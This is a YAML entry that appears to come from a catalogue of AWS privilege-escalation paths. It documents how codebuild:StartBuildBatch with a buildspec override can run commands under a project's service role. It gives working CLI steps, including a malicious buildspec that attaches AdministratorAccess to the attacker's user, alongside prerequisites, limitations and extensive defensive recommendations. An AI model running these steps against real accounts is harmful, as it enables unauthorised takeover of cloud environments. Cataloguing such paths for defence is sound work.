id: codebuild-003
name: codebuild:StartBuildBatch
category: access-resource
services:
- codebuild
- iam
description: A principal with `codebuild:StartBuildBatch` can exploit an existing CodeBuild project that has a privileged service role by using the `--buildspec-override` parameter to execute arbitrary commands with elevated permissions. Similar to `codebuild:StartBuild`, this permission allows injecting malicious buildspecs without requiring `iam:PassRole` or `codebuild:CreateProject` permissions. The attacker can leverage batch build capabilities to execute commands with the project's service role permissions, potentially achieving administrative access if the role is sufficiently privileged.
prerequisites:
  admin:
  - A CodeBuild project must already exist in the account that is configured for batch builds
  - The existing project must have a service role with administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  - The project must allow buildspec overrides (default behavior unless explicitly disabled)
  lateral:
  - A CodeBuild project must already exist in the account that is configured for batch builds
  - The existing project must have a service role with any level of permissions
  - The project must allow buildspec overrides (default behavior unless explicitly disabled)
exploitationSteps:
  awscli:
  - step: 1
    command: aws codebuild list-projects --region us-east-1
    description: Discover existing CodeBuild projects in the account (optional but helpful for reconnaissance)
  - step: 2
    command: aws codebuild batch-get-projects --names EXISTING_PROJECT_NAME --region us-east-1
    description: Inspect the project details to identify the service role ARN and verify it has elevated permissions (optional but helpful)
  - step: 3
    command: |
      cat > /tmp/malicious-buildspec.yml <<'EOF'
      version: 0.2
      batch:
        fast-fail: false
        build-list:
          - identifier: privesc_build
            buildspec: |
              version: 0.2
              phases:
                build:
                  commands:
                    - echo "Starting privilege escalation..."
                    - aws iam attach-user-policy --user-name YOUR_USERNAME --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
                    - echo "Successfully attached AdministratorAccess policy"
      EOF
    description: Create a malicious buildspec file with batch build format that attaches AdministratorAccess to your user account
  - step: 4
    command: |
      aws codebuild start-build-batch \
        --project-name EXISTING_PROJECT_NAME \
        --region us-east-1 \
        --buildspec-override file:///tmp/malicious-buildspec.yml
    description: Start a build batch with the malicious buildspec override. The buildspec executes with the project's privileged service role permissions.
  - step: 5
    command: aws codebuild batch-get-build-batches --ids BUILD_BATCH_ID --region us-east-1
    description: Monitor the build batch status to confirm it completed successfully (batch builds may take 2-4 minutes)
  - step: 6
    command: aws iam list-users --max-items 3
    description: Verify administrative access was successfully obtained (wait 15-30 seconds for IAM propagation)
limitations: |
  This path provides administrative access only if the existing CodeBuild project's service role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If the project only has limited permissions, you gain access limited to those permissions. However, even limited access may enable multi-hop privilege escalation attacks.

  This attack requires that:
  1. An existing CodeBuild project allows buildspec overrides (default behavior)
  2. The project is configured to support batch builds
  3. The service role has sufficient permissions to modify IAM policies or principals

  Organizations can disable buildspec overrides in project configuration to prevent this attack vector.
recommendation: |
  Restrict `codebuild:StartBuildBatch` permission using resource-based constraints:

  ```json
  {
    "Effect": "Allow",
    "Action": "codebuild:StartBuildBatch",
    "Resource": "arn:aws:codebuild:*:ACCOUNT_ID:project/specific-safe-project"
  }
  ```

  Additional security controls:
  - **Least Privilege Service Roles**: Ensure CodeBuild service roles follow least privilege principles and cannot modify IAM permissions
  - **Disable Buildspec Override**: For projects with privileged roles, disable buildspec overrides in the project configuration by setting `overrideConfigurationOverride` to prevent buildspec modifications
  - **Require Source Control Buildspecs**: Configure CodeBuild projects to require buildspecs from source control (GitHub, CodeCommit) rather than allowing inline overrides
  - **CloudTrail Monitoring**: Alert on `StartBuildBatch` API calls with `buildspec-override` parameter, especially on projects with privileged roles
  - **Monitor IAM Changes**: Alert on `AttachUserPolicy`, `PutUserPolicy`, `AttachRolePolicy`, and `PutRolePolicy` calls originating from CodeBuild service principals
  - **Service Control Policies**: Implement SCPs to prevent CodeBuild service roles from modifying IAM policies
  - **IAM Access Analyzer**: Use AWS IAM Access Analyzer to identify privilege escalation paths involving CodeBuild batch builds
  - **Regular Audits**: Review CodeBuild projects with batch build capabilities to identify those with privileged service roles and restrict access accordingly
  - **Tag-Based Access Control**: Tag CodeBuild projects with privilege levels and enforce tag-based conditional access policies
  - **Approval Workflows**: Require manual approval for buildspec overrides on sensitive CodeBuild projects with privileged service roles
discoveredBy:
  name: Unknown
  organization: Unknown
references:
- title: AWS CodeBuild API Reference - StartBuildBatch
  url: https://docs.aws.amazon.com/codebuild/latest/APIReference/API_StartBuildBatch.html
- title: AWS CodeBuild - Batch Builds
  url: https://docs.aws.amazon.com/codebuild/latest/userguide/batch-build.html
- title: AWS CodeBuild - Build Specification Reference
  url: https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html
relatedPaths:
- codebuild-001
- codebuild-002
- iam-001
- iam-002
toolSupport:
  pmapper: false
  iamVulnerable: false
  pacu: false
  prowler: false
permissions:
  required:
  - permission: codebuild:StartBuildBatch
    resourceConstraints: Must have permission to start build batches on the target CodeBuild project
  additional:
  - permission: codebuild:ListProjects
    resourceConstraints: Helpful for discovering existing CodeBuild projects with privileged roles
  - permission: codebuild:BatchGetProjects
    resourceConstraints: Useful for viewing project details including service role ARN and permissions
  - permission: codebuild:BatchGetBuildBatches
    resourceConstraints: Helpful for monitoring build batch execution status and verifying successful exploitation
